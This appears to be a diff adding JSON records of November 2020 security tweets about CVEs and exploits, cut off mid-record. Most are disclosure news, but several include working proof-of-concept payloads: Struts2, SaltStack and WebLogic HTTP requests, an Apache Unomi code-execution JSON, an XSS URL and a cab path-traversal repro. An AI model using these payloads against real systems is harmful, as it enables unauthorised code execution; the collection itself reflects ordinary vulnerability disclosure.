@@ -2916,3 +2916,1875 @@
     "tweeturl": "https://twitter.com/certbund/status/1322978362575540232",
     "username": "certbund"
 }
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/",
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 149,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 45,
+    "tweettext": "Exploiting a “Simple” Vulnerability – In 35 Easy Steps or Less! : https://t.co/MeaWzbFCqs credits @yarden_shafir\n\nPoC demonstrating the use of cve-2020-1034 for privilege escalation : https://t.co/odMCuUnvWa https://t.co/7EFzXVgSx2",
+    "tweettime": "2020-11-30, 05:06:42",
+    "tweeturl": "https://twitter.com/binitamshah/status/1333276243861540865",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://www.drupal.org/sa-core-2020-013"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "CVE-2020-28949/CVE-2020-28948\nhttps://t.co/2C4KXdQmpv\nRCE on Drupal via Phar Deserialization in PEAR Archive_Tar library. \n\nPoc: phar =&gt; PHAR\nPHAR://malicious_file.phar https://t.co/FS8iAdPg3w",
+    "tweettime": "2020-11-26, 17:18:53",
+    "tweeturl": "https://twitter.com/chybeta/status/1332010953370529793",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 60,
+    "tweettext": "Checkpoint ICA Management Tool (CVE-2020-6020) research by Mikhail Klyuchnikov &amp; Nikita Abramov.\n\n1⃣Send /etc/shadow to yourself via SMTP\n2⃣Simple DoS\n\nhttps://t.co/xsC0XVMupq https://t.co/0L6fHJpiW0",
+    "tweettime": "2020-11-25, 14:27:21",
+    "tweeturl": "https://twitter.com/ptswarm/status/1331605399095681024",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 8,
+    "tweettext": "It seems chromium patched my first found since I started hunting for chromium sandbox escape this year(CVE-2020-16018 reported by Man Yue Mo @mmolgtm), really interested in focusing on a new challenging research😋 https://t.co/qwn1cDAwL7",
+    "tweettime": "2020-11-25, 04:07:03",
+    "tweeturl": "https://twitter.com/KeyZ3r0/status/1331449295199899648",
+    "username": "KeyZ3r0"
+}
+{
+    "expanded_url": [
+        "https://webkitgtk.org/security/WSA-2020-0008.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "Some of my Webkit GTK/WPE vulns have been patched :\nhttps://t.co/sNuOOwwVjB\nCVE-2020-13584\nCVE-2020-9951\nMore details next week ;)",
+    "tweettime": "2020-11-23, 22:14:56",
+    "tweeturl": "https://twitter.com/_Icewall/status/1330998292029837321",
+    "username": "_Icewall"
+}
+{
+    "expanded_url": [
+        "https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 19,
+    "tweettext": "Write-up of the code execution vulnerability I found in the Elixir-based Paginator project (CVE-2020-15150)\n\nhttps://t.co/sv2zfe6aNv",
+    "tweettime": "2020-11-23, 18:52:48",
+    "tweeturl": "https://twitter.com/ulldma/status/1330947425457102850",
+    "username": "ulldma"
+}
+{
+    "expanded_url": [
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 84,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 33,
+    "tweettext": "GitHub - yardenshafir/CVE-2020-1034: PoC demonstrating the use of cve-2020-1034 for privilege escalation - https://t.co/qsXBcxzu7U",
+    "tweettime": "2020-11-23, 17:38:52",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1330928818840764417",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://github.com/0xedh/hichip-p2p-firmware-rce"
+    ],
+    "tweetfavorites": 36,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 22,
+    "tweettext": "After a while I have published the exploit for CVE-2020-9527, Hichip's P2P cameras RCE. Thanks to @PaulMarrapese for his previous research.\n\nhttps://t.co/n34q3AlE0V",
+    "tweettime": "2020-11-23, 17:01:54",
+    "tweeturl": "https://twitter.com/0xedh/status/1330919517782945794",
+    "username": "0xedh"
+}
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less"
+    ],
+    "tweetfavorites": 480,
+    "tweetquotes": 10,
+    "tweetreplies": 4,
+    "tweetretweets": 156,
+    "tweettext": "I pretended I'm an exploit dev and created a stable exploit to CVE-2020-1034, that's tagged by MS as \"low complexity\". But only if crashing the machine is your only goal:\nhttps://t.co/G0HZffpIq0\nThank you @aionescu for all the help and reviews! 😄 https://t.co/JMbbyJGyxN",
+    "tweettime": "2020-11-23, 12:38:45",
+    "tweeturl": "https://twitter.com/yarden_shafir/status/1330853292352679936",
+    "username": "yarden_shafir"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-in/HT211934"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 6,
+    "tweetretweets": 4,
+    "tweettext": "Safari 14.0.1 With Fixes of Address Bar Spoofing Vulnerability.\nCVE-2020-9945\ndetails will be out once the fix is released from different browsers as well.\nhttps://t.co/NSyAtPd8iQ \n#infosec #infosec #hacking #bugbounty https://t.co/yRyyxlD1h7",
+    "tweettime": "2020-11-20, 14:30:55",
+    "tweeturl": "https://twitter.com/imnarendrabhati/status/1329794356841070592",
+    "username": "imnarendrabhati"
+}
+{
+    "tweetfavorites": 368,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 103,
+    "tweettext": "Do you known that Cisco ISE is vulnerable to CVE-2017-5638 Apache Struts2 RCE?\n\nPort: 8443\nPayload:\n\nGET /sponsorportal/LoginCheck.action HTTP/1.0\nHost: 10.0.0.1:8443\nUser-Agent: Mozilla\nContent-Type: %{...}\n\nCisco ISE is a NAP system that might be found on network boundaries.",
+    "tweettime": "2020-11-19, 14:58:07",
+    "tweeturl": "https://twitter.com/_mohemiv/status/1329438812158746629",
+    "username": "_mohemiv"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 70,
+    "tweettext": "RT @ptswarm: The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows l…",
+    "tweettime": "2020-11-19, 13:49:51",
+    "tweeturl": "https://twitter.com/jedisct1/status/1329421633287827457",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ucs-api-rce-UXwpeDHd"
+    ],
+    "tweetfavorites": 143,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 70,
+    "tweettext": "The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows lead to RCE with uid=0 (root) privileges\n\nDiscovered by Nikita Abramov\n\nhttps://t.co/s6T3YDswoG https://t.co/8fBFauF8SR",
+    "tweettime": "2020-11-19, 13:32:32",
+    "tweeturl": "https://twitter.com/ptswarm/status/1329417273719853062",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/3nmuFiY"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 30,
+    "tweettext": "CVE-2020-8277 Node.js Denial of Service through DNS request\n\nhttps://t.co/AoPtUPUOPd https://t.co/6ksdv0Y8G2",
+    "tweettime": "2020-11-19, 12:40:03",
+    "tweeturl": "https://twitter.com/chybeta/status/1329404066502299649",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.co/3msMoMy"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "ICYMI @mmolgtm explains how to exploit CVE-2020-6449, a use-after-free (UAF) in the WebAudio module of Chrome, and achieve a sandboxed RCE. Read also how he used #CodeQL to accelerate his code audit https://t.co/k5ddV8Scv3",
+    "tweettime": "2020-11-18, 15:57:01",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1329091248997625857",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1398/"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "CVE-2020-16846\nCVE-2020-25592\nSaltStack Salt REST API RCE\n\n[PoC]\nPOST /run HTTP/1.1\nHost: [Victim:8888]\n...\n...\n\ntoken=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|open%20/System/Applications/Calculator.app%3b\n\nhttps://t.co/jdgIUFSW6x https://t.co/s7xlLDkHDX",
+    "tweettime": "2020-11-18, 06:06:51",
+    "tweeturl": "https://twitter.com/wugeej/status/1328942729095753731",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 469,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 162,
+    "tweettext": "#CVE-2020-13942 Apache Unomi Remote Code Execution\n\nPoC:\n{\"filters\":[{\"id\" : \"pyn3rd\",\"filters\": [{\"condition\": {\"parameterValues\": {\"pyn3rd\": \"script::Runtime.getRuntime().exec('open -a Calculator')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\": \"pyn3rd\"} https://t.co/Gcw5FcZiNp",
+    "tweettime": "2020-11-18, 04:38:42",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328920545442680837",
+    "username": "pyn3rd"
+}
+{
+    "tweetfavorites": 208,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-13942 Apache Unomi pre-auth RCE (bypass CVE-2020-11975 ) https://t.co/q7ppLTJdiT",
+    "tweettime": "2020-11-18, 04:05:59",
+    "tweeturl": "https://twitter.com/chybeta/status/1328912309440311297",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html"
+    ],
+    "tweetfavorites": 135,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 48,
+    "tweettext": "When analyzing CVE-2020-1380, I found another path to trigger a similar UAF vulnerability by neutering ArrayBuffer without JIT. \nIt has beed fixed in Microsoft November’s Patch as CVE-2020-17053.\nhttps://t.co/ucHH2cmYVN",
+    "tweettime": "2020-11-18, 02:38:58",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1328890412413534209",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/"
+    ],
+    "tweetfavorites": 353,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 169,
+    "tweettext": "💥New article \"Path Traversal on Citrix XenMobile Server\" with a step-by-step guide to disclosing encryption keys, decrypting passwords, and thoroughly understanding CVE-2020-8209 by our researcher Andrey Medov.\n\nRead all about it: https://t.co/JMJM0UiSRu\n\nThe PoC⬇️ https://t.co/iRpdYELfjK",
+    "tweettime": "2020-11-16, 14:36:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1328346259502018560",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://x-stream.github.io/CVE-2020-26217.html"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "#CVE-2020-26217 XStream Remote Code Execution \n\nhttps://t.co/baqFucu0BQ https://t.co/o9UHU8eTQv",
+    "tweettime": "2020-11-16, 02:47:32",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328167793611554819",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/exploring-the-exploitability-of-bad-neighbor-the-recent-icmpv6-vulnerability-cve-2020-16898/"
+    ],
+    "tweetfavorites": 81,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 48,
+    "tweettext": "Exploring the Exploitability of “Bad Neighbor”: The Recent ICMPv6 Vulnerability (CVE-2020-16898)  https://t.co/WHjYcHvudH  #Pentesting #RCE #Vulnerability #CyberSecurity #Infosec https://t.co/CpYiv9N27y",
+    "tweettime": "2020-11-14, 16:40:20",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1327652599051464704",
+    "username": "ptracesecurity"
+}
+{
+    "tweetfavorites": 343,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 134,
+    "tweettext": "Nothing critical, but here is the PoC for the new CVE I got credited for: CVE-2020-14815. \n\nhttps://target[.]com/bi-security-login/login.jsp?msi=false&amp;redirect=\"&gt;&lt;img/src/onerror%3dalert(document.domain)&gt;\n\nGot a couple of Med in H1 using it. Have Fun!\n\n#bugbounty #bugbountytips https://t.co/A8qx640VgE",
+    "tweettime": "2020-11-12, 16:40:33",
+    "tweeturl": "https://twitter.com/HackerOn2Wheels/status/1326927875279380480",
+    "username": "HackerOn2Wheels"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-patches-two-more-chrome-zero-days/"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 13,
+    "tweetreplies": 2,
+    "tweetretweets": 94,
+    "tweettext": "BREAKING: Google patches two more Chrome zero-days\n\nThis includes:\n-CVE-2020-16013 - impacts Chrome V8 JS engine\n-CVE-2020-16017 - impacts Chrome's Site Isolation feature\n\nGoogle has now patched five Chrome zero-days in three weeks\n\nhttps://t.co/ohF2CHwvOG https://t.co/BXFa1wzSwR",
+    "tweettime": "2020-11-11, 22:41:32",
+    "tweeturl": "https://twitter.com/campuscodi/status/1326656333580480514",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0025/",
+        "https://srcincite.io/pocs/cve-2020-17083.ps1.txt"
+    ],
+    "tweetfavorites": 201,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 124,
+    "tweettext": "Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability\n\nCVE: CVE-2020-17083\nAdvisory: https://t.co/sf7upoNmjC\nPoC exploit: https://t.co/lzKWSGhSjG",
+    "tweettime": "2020-11-11, 20:43:16",
+    "tweeturl": "https://twitter.com/sourceincite/status/1326626570073755648",
+    "username": "sourceincite"
+}
+{
+    "expanded_url": [
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14882%22",
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14750%22"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "new tags to track recent WebLogic RCE (CVE-2020-14882, 14883, 14750) -\n\nhttps://t.co/XH4J4A5RIh\n\nhttps://t.co/uq9mqYuvHV",
+    "tweettime": "2020-11-11, 17:53:41",
+    "tweeturl": "https://twitter.com/ackmage/status/1326583893080870915",
+    "username": "ackmage"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/microsoft-releases-windows-security.html"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 12,
+    "tweetreplies": 5,
+    "tweetretweets": 141,
+    "tweettext": "November 2020 Patch Tuesday — #Microsoft releases security updates for 112 newly discovered vulnerabilities, including an actively exploited zero-day flaw (CVE-2020-17087) disclosed by #Google's security team last week.\n\nhttps://t.co/DwSQZTX8v6\n\n#Infosec #CyberSecurity",
+    "tweettime": "2020-11-11, 10:14:04",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1326468227040374784",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 24,
+    "tweettext": "The description for CVE-2020-17083 is wrong, user interaction is *not* required. Also this is RCE as SYSTEM, so the actual CVSS is 8.5: https://t.co/qJWBH3ldCf",
+    "tweettime": "2020-11-10, 22:02:45",
+    "tweeturl": "https://twitter.com/steventseeley/status/1326284184122519561",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.cyberark.com/resources/threat-research-blog/intel-please-stop-assisting-me"
+    ],
+    "tweetfavorites": 40,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 15,
+    "tweettext": "This was a long wait, this will be my last blog for some while - CVE-2020-22460, CVE-12330, CVE-2020-12335\nhttps://t.co/ALNAPL16xT",
+    "tweettime": "2020-11-10, 18:10:48",
+    "tweeturl": "https://twitter.com/EranShimony/status/1326225811087749121",
+    "username": "EranShimony"
+}
+{
+    "expanded_url": [
+        "https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "Critical Vulnerabilities Discovered in TCL Android TVs\n\nCVE-2020-27403\nFull file system browsing of the TV in the browser.\n\nCVE-2020-28055\nWorld writable update folder (malicious updates possible)\n : https://t.co/nahQGxkhGY \n\ncredits @sickcodes  || @johnjhacking",
+    "tweettime": "2020-11-09, 22:56:44",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325935382991523840",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://community.disclose.io/t/how-i-found-a-tor-vulnerability-in-brave-browser-reported-it-watched-it-get-patched-got-a-cve-cve-2020-8276-and-a-small-bounty-all-in-one-working-day/65"
+    ],
+    "tweetfavorites": 290,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 55,
+    "tweettext": "How I found a Tor vulnerability in Brave Browser, reported it, watched it get patched, got a CVE (CVE-2020-8276) and a small bounty, all in one working day : https://t.co/byy6rmUOl7   credits @sickcodes",
+    "tweettime": "2020-11-09, 22:22:46",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325926835591421953",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/UR3NNVf",
+        "https://saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "CVE-2020-25592  Any value for \"eauth\"/\"token” allow a user to bypass auth and make calls to Salt SSH.\n\nCVE-2020-16846 A user could use shell injections with the Salt API using the SSH Client.  \n\n25592+16846=Unauth RCE \n\n分析 https://t.co/tC20h1LUFq\n\nhttps://t.co/HbyQg9ZuIl https://t.co/YnfKRS7QTt",
+    "tweettime": "2020-11-09, 16:22:27",
+    "tweeturl": "https://twitter.com/chybeta/status/1325836157653934080",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/pprietosanchez/CVE-2020-14750"
+    ],
+    "tweetfavorites": 335,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 157,
+    "tweettext": "Oracle Weblogic PoC for vulnerabilities CVE-2020-14750 and cve-2020-14882\n\nBe careful ! It is working\n\n./CVE-2020-14750 hostname: 7001 ifconfig lo\n./CVE-2020-14750 hostname: 7001 ls\n./CVE-2020-14750 hostname: 7001 vi etc/passwd\n\nhttps://t.co/UeZof859NP https://t.co/YTH6Ztx6p6",
+    "tweettime": "2020-11-09, 05:35:25",
+    "tweeturl": "https://twitter.com/wugeej/status/1325673327357173762",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 769,
+    "tweetquotes": 35,
+    "tweetreplies": 13,
+    "tweetretweets": 307,
+    "tweettext": "Free threat intel - identify and patch VMware ESX vulnerabilities CVE-2019-5544 and CVE-2020-3992. \n\nRansomware group using them to bypass all Windows OS security, by shutting down VMs and encrypting the VMDK’s directly on hypervisor.",
+    "tweettime": "2020-11-07, 02:06:48",
+    "tweeturl": "https://twitter.com/GossiTheDog/status/1324896051128635392",
+    "username": "GossiTheDog"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 455,
+    "tweettext": "RT @benhawkes: Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE),…",
+    "tweettime": "2020-11-05, 19:03:14",
+    "tweeturl": "https://twitter.com/cherepanov74/status/1324427068592001025",
+    "username": "cherepanov74"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-us/HT211929"
+    ],
+    "tweetfavorites": 931,
+    "tweetquotes": 144,
+    "tweetreplies": 15,
+    "tweetretweets": 404,
+    "tweettext": "Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE), CVE-2020-27950 (memory leak), and CVE-2020-27932 (kernel privilege escalation). The security bulletin is available here: https://t.co/4OIReajIp6",
+    "tweettime": "2020-11-05, 18:46:37",
+    "tweeturl": "https://twitter.com/benhawkes/status/1324422885830610944",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "http://com.tangosol.coherence.mvel2.sh",
+        "https://github.com/jas502n/CVE-2020-14882"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14882\nWeblogic RCE by only one GET reques\n\n#bypass patch \n\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\n...\n...\n_nfpb=true&amp;_pageLabel=&amp;handle=https://t.co/1P6ayf6Arf.ShellSession(\"java.lang.Runtime.getRuntime().exec('calc.exe');\");\n\nhttps://t.co/SkNAFJi8Dw https://t.co/D1zKwr5W0D",
+    "tweettime": "2020-11-05, 07:51:35",
+    "tweeturl": "https://twitter.com/wugeej/status/1324258040686669824",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "Git  &amp; GitHub CLI Remote CodeExec #RCE #exploit  via Git LFS CVE-2020-27955 @dawid_golunski\n\nRepo clone to Pwn ;) Full advisory with #PoC at\nhttps://t.co/n0vnrcSUCg\n\n#cybersecurity #infosec #hacking #security  #0day #git #github cli  #vuln #DevOps https://t.co/516I33RxYd",
+    "tweettime": "2020-11-05, 03:53:57",
+    "tweeturl": "https://twitter.com/Exploit_Box/status/1324198238887514112",
+    "username": "Exploit_Box"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 29,
+    "tweettext": "How would you exploit this UAF :)?\n\n“Discovery and analysis of a Windows PhoneBook Use-After-Free vulnerability (CVE-2020-1530)”, an instructive blog post by @symeonp:\nhttps://t.co/AHw1uWdm7e",
+    "tweettime": "2020-11-04, 18:46:50",
+    "tweeturl": "https://twitter.com/TimoHirvonen/status/1324060555536117764",
+    "username": "TimoHirvonen"
+}
+{
+    "expanded_url": [
+        "https://wikileaks.org/hackingteam/emails/emailid/45441"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14871 had been exploited and distributed in the wild to numerous groups since at least October 6th 2014. That's 6 years that this vulnerability was available as 0day to multiple non-exclusive parties, VBI leak in HT emails shows it's the same bug. https://t.co/Prh3tm3DHN https://t.co/Efv6jtPFOB",
+    "tweettime": "2020-11-04, 16:15:07",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1324022373255909377",
+    "username": "hackerfantastic"
+}
+{
+    "tweetfavorites": 136,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "For those that want to repro CVE-2020-1300 you can just use makecab, no need to manually calc checksums now:\n\nc:\\&gt;type files.txt\n\"rce.exe\" \"../../rce.exe\"\nc:\\&gt;makecab /f files.txt",
+    "tweettime": "2020-11-03, 18:30:35",
+    "tweeturl": "https://twitter.com/steventseeley/status/1323694078022848512",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://github.com/hackerhouse-opensource/exploits/blob/master/prdelka-vs-SUN-sshd.tgz"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 99,
+    "tweettext": "Dirty libssh2 PoC for CVE-2020-14871 to core target and pack with your favorite shellcode &amp; return addresses, something for the kidz on lockdown. Happy Hacking. https://t.co/7dqSGjOXqw https://t.co/UtnyDtxx1s",
+    "tweettime": "2020-11-03, 14:58:13",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323640631613394945",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://github.com/RedTeamPentesting/CVE-2020-13935"
+    ],
+    "tweetfavorites": 101,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "Exploit for WebSocket Vulnerability in Apache Tomcat (CVE-2020-13935)\n\nAffected Versions:\n10.0.0-M1 to 10.0.0-M6\n9.0.0.M1 to 9.0.36\n8.5.0 to 8.5.56\n8.0.1 to 8.0.53\n7.0.27 to 7.0.104\n\nPoC\nhttps://t.co/zn9K3XLQny https://t.co/5HYieTU47f",
+    "tweettime": "2020-11-03, 06:22:33",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1323510861940596736",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/chrome-for-android-update.html"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "A few people noticed that CVE-2020-16010 wasn't included in the link above. That's because Chrome has separate release notes for Desktop and Android. The release notes covering CVE-2020-16010 (sandbox escape for Chrome on Android) are now available here: https://t.co/6hBKMuCAaK",
+    "tweettime": "2020-11-03, 01:59:22",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323444628926820352",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 696,
+    "tweetquotes": 26,
+    "tweetreplies": 18,
+    "tweetretweets": 263,
+    "tweettext": "CVE-2020-14871 - well that was easy, SSH pre-auth RCE on Solaris through libpam. As a PoC trigger you need to ensure the remote host is using keyboard-interactive and then reach the vulnerable code path by specifying a blank username to get PAM to hit the vulnerable function. https://t.co/HQtSBBQ6g1",
+    "tweettime": "2020-11-03, 01:07:15",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323431512822435841",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
+    "tweettext": "Today Chrome fixed two more vulnerabilities that were being actively exploited in the wild (discovered by Project Zero/Google TAG last week). CVE-2020-16009 is a v8 bug used for remote code execution, CVE-2020-16010 is a Chrome sandbox escape for Android. https://t.co/IOhFwT0Wx1",
+    "tweettime": "2020-11-02, 21:20:01",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323374326150701057",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Another in-the-wild Chrome 0day patched (CVE-2020-16009), reported by @_clem1 from TAG and @5aelo from Project Zero: https://t.co/SP1SR3aXEp",
+    "tweettime": "2020-11-02, 21:09:24",
+    "tweeturl": "https://twitter.com/anttitikkanen/status/1323371654966349826",
+    "username": "anttitikkanen"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/warning-google-discloses-windows-zero.html"
+    ],
+    "tweetfavorites": 225,
+    "tweetquotes": 13,
+    "tweetreplies": 4,
+    "tweetretweets": 181,
+    "tweettext": "WATCH OUT! Google disclosed details of a new zero-day flaw (CVE-2020-17087) in the Windows operating system that's being actively exploited in the wild.\n\nDetails: https://t.co/tgtxsM9N2u\n\n#infosec #cybersecurity",
+    "tweettime": "2020-11-02, 09:45:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1323199634538332162",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 349,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 95,
+    "tweettext": "Quickly confirm if your organization is affected by recent Oracle WebLogic RCE - CVE-2020-14882 on single or list of URLs.\n\nShout out to @dwisiswant0 for sharing the nuclei templates including recent bypass.\n\n#hackwithautomation #bugbountytips #infosec #security https://t.co/qYdfr7GCLP",
